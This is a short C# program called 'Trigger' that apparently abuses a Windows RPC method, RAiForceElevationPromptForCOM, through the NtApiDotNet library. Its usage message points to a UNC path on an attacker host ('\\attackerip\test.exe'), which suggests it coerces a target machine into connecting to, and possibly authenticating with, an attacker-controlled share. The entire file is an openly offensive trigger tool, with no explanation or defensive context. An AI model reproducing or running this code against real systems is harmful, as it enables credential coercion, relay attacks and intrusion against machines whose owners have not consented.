using System;
using NtApiDotNet.Ndr.Marshal;

namespace Trigger
{ 
    class Program
    {
            static void Main(String[] args)
            {

                if (args.Length == 0)
                { 
                    Console.WriteLine(@"[*] Specify the target path e.G. \\attackerip\test.exe");
                    return;
                }
                try
                {
                    using (var client = new Client())
                    {
                        client.Connect();
                        
                        NdrUInt3264 fist_input = new NdrUInt3264();
                        Guid seccond = new Guid();
                        client.RAiForceElevationPromptForCOM(fist_input, 0, 0, 0, "", seccond, "", "", "", args[0], 0);
                        

                        Console.WriteLine("[*] Done.");


                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                    Console.WriteLine($"Stack trace: {ex.StackTrace}");
                }
            }
    }


}